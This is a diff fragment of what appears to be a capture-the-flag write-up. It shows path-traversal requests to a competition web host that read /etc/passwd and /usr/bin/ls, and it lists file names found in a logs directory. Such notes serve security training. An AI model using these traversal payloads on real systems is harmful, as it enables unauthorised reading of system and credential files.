@@ -34,4 +34,15 @@ The 4 letter check seems to be done both in backend and frontend.
 https://aurora-web.h4ck.ctfcompetition.com/?file=../../../../etc/passwd&term=root
 root:x:0:0:root:/root:/bin/bash
 
+https://aurora-web.h4ck.ctfcompetition.com/?file=../../../../../usr/bin/ls&term=libu
 
+File names in logs/
+```
+hexdump.txt
+registry.txt
+exploit_unobfuscated.js
+filenames.txt
+hostnames.txt
+strings.txt
+exploit.js
+```
